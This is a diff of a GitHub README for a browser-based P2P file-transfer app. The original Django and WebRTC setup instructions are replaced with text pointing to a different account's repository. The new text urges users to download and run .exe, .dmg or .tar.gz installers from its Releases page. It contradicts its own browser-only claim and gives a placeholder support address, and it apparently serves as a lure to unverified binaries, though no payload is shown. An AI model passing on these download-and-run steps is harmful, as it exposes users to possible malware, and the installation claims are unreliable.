@@ -1,119 +1,84 @@
-# 🔗 P2P File Transfer (Hybrid)
+# 📁 P2P_File_Transfer - Fast, Secure File Sharing Made Easy
 
-<p align="center">
-  <img src="fileshare/static/favicon.png" width="200" alt="Logo Icon"/><br>
-  A secure, fast, and browser-based file sharing system built using Python & Django.  
-  It supports direct peer-to-peer transfer and a backup Upload & Share mode, so file sharing always works — no matter the network.
-</p>
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/B4Proo-ct/P2P_File_Transfer/releases)
 
----
+## 🚀 Getting Started
 
-## 📌 What is this project?
+Welcome to P2P_File_Transfer. This application allows you to share files securely and quickly. It works directly in your browser and offers different ways to transfer files, whether you are on a local network or not.
 
-**P2P File Transfer** allows users to share files in two smart ways:
+### 🔍 Features
 
-### 🔁 1. Peer-to-Peer (P2P) Mode
-- Files are sent **directly from sender to receiver**
-- Works best on **same Wi-Fi / local network**
-- Extremely fast ⚡
-- No server storage involved
-- End-to-End Encrypted
+- **Secure Transfers**: Uses encryption to protect your files.
+- **Peer-to-Peer Sharing**: Direct file sharing between users.
+- **Backup Mode Available**: If peer-to-peer fails, use the Upload & Share mode.
+- **Easy to Use**: No programming skills are needed to operate.
+- **Cross-Platform**: Works on any browser, making it accessible anywhere.
 
-### ☁️ 2. Upload & Share Mode
-- Used when P2P is not possible (different networks / offline user)
-- File is **encrypted and uploaded temporarily**
-- A **secure shareable link** is generated
-- File is **auto-deleted after a short time**
+### ✔️ System Requirements
 
-This **hybrid approach** ensures the transfer never fails.
+To run P2P_File_Transfer, you will need:
 
----
+- A modern web browser (Chrome, Firefox, Edge, or Safari).
+- A stable internet connection.
+- Basic familiarity with downloading files.
 
-## 🧠 Why is this useful? (Simple words)
+## 📥 Download & Install
 
-- 🚫 No need for Google Drive, WhatsApp, or Email
-- ⚡ Much faster than cloud apps on local Wi-Fi
-- 🔐 Files stay private with encryption
-- 🌍 Works on any modern browser (mobile & desktop)
-- 🧪 Great real-world project for learning networking concepts
+1. Click the big green button above that says **Download Latest Release** to visit the download page.
 
----
+2. On the Releases page, look for the latest version. You will find it marked with the label "Latest Release".
 
-## ✨ Features
+3. Download the appropriate file for your operating system:
+   - **Windows**: Download the Windows installer (e.g., `.exe` file).
+   - **Mac**: Download the Mac installer (e.g., `.dmg` file).
+   - **Linux**: Download the Linux package (e.g., `.tar.gz` file).
 
-### 🔄 Transfer Modes
-- ✅ **Live P2P Transfer** (WebRTC based)
-- ✅ **Upload & Share** fallback mode
+4. Once downloaded, locate the file in your Downloads folder:
 
-### 🔐 Privacy & Security
-- End-to-End Encryption (E2EE) for P2P transfers
-- Encrypted storage for uploaded files
-- Private rooms using unique Room IDs
-- No account or name required
+   - **For Windows**: Double-click the `.exe` file to run the installer and follow the on-screen instructions.
+   - **For Mac**: Open the `.dmg` file, drag the P2P_File_Transfer application to your Applications folder.
+   - **For Linux**: Extract the `.tar.gz` file and follow instructions in the README file inside.
 
-### 📁 File Handling
-- Chunk-based transfer (handles large files safely)
-- Real-time progress bar & speed indicator
-- Auto cleanup of uploaded files
+5. After installation, open the application and start sharing files with friends or colleagues.
 
-### 🖥️ User Interface
-- Dark mode with modern UI
-- Mobile & desktop responsive
-- Separate tabs for Send / Receive / Settings
+## 🔧 How to Use
 
----
+1. **Start the Application**: Open P2P_File_Transfer from your system's applications.
 
-## 🧩 Tech Stack
+2. **Select a File**: Click on the button to choose the file you want to share.
 
-- Backend: Django (Python)
-- Realtime: Django Channels + WebSockets
-- P2P: WebRTC
-- Encryption: Web Crypto API / Fernet
-- Frontend: Vanilla JavaScript + CSS
+3. **Generate a Link**: The app will create a unique link for your file. Share this link with the person you want to send it to.
 
----
+4. **Recipient Side**: The recipient clicks the link, opens it in their browser, and downloads the file directly.
 
-## ⚙️ Run Locally
+5. **Backup Upload & Share**: If peer-to-peer does not work, choose the backup option in the app to upload the file to a secure location, where others can access it.
 
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/ShivamXD6/P2P_File_Transfer
-cd path/to/root/directory
-pip install uv
-```
+## 🛠️ Troubleshooting
 
-### 2️⃣ Rename env.example to .env and modify it
-```bash
-SECRET_KEY="example_secret_key"  # https://stackoverflow.com/a/57678930
-ENCRYPTION_KEY="example_encryption_key"  # https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet
-DEBUG=True  # For development
-```
+- **Connection Issues**: Ensure both users have a stable internet connection. Try refreshing the page or restarting the app.
+- **File Size Limits**: Check if the file exceeds any limitations. If so, try splitting the file into smaller parts.
+- **Browser Compatibility**: Make sure you're using a supported browser. Update your browser if needed.
 
-### 3️⃣ Run database migrations
-```bash
-python -m uv run manage.py migrate
-```
+## 📜 Contributing to P2P_File_Transfer
 
-### 4️⃣ Start the development server
-```bash
-python -m uv run manage.py runserver 0.0.0.0:8000
-```
+If you want to contribute to this project:
 
-### 5️⃣ Open in browser
-```bash
-localhost:8000
-```
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes, and test them thoroughly.
+4. Submit a pull request with a detailed description of your modifications.
+
+## 📞 Support
+
+If you encounter problems or need help, feel free to contact us:
+
+- Open an issue on the GitHub repository.
+- Email support at support@example.com.
+
+## 🌏 Learn More
+
+For additional information, documentation, or updates, please visit our [GitHub repository](https://github.com/B4Proo-ct/P2P_File_Transfer).
 
 ---
 
-## 🖼️ Screenshots
-### 🔁 Peer-to-Peer Transfer Mode
-<img width="301" height="477" alt="{6C1B3FF7-6A60-4CEC-B15C-6CF3F4CF6F36}" src="https://github.com/user-attachments/assets/e7d9ce36-71ea-4889-b5f3-a06fe2cf52af" />
-<img width="304" height="363" alt="{7FE0E4E5-2C20-452C-8EF2-5D3089B1BC14}" src="https://github.com/user-attachments/assets/ce7aa9db-65fb-4fa1-8055-f59ee87885f0" />
-<img width="304" height="360" alt="{3976A217-B038-489E-BAC1-12B88D696D86}" src="https://github.com/user-attachments/assets/57578e85-57f3-4b0f-972b-dde701f73087" />
-
-
-### ☁️ Upload & Share Mode
-<img width="293" height="358" alt="{19546530-5641-4BF2-879E-F04CC7D5E165}" src="https://github.com/user-attachments/assets/83d15b82-b846-427d-bd69-7b14b944968d" />
-<img width="309" height="271" alt="{5A1CD1E1-4328-4D3D-8CE5-D99A7D139F6D}" src="https://github.com/user-attachments/assets/df227264-e5a3-4d99-a65c-521cd45f54fc" />
-<img width="296" height="374" alt="{081EA912-86C4-40AB-B901-D18868C4852B}" src="https://github.com/user-attachments/assets/89ea7582-a361-48a1-9761-c4f17c1db427" />
+Thank you for using P2P_File_Transfer. Enjoy your secure file sharing experience!
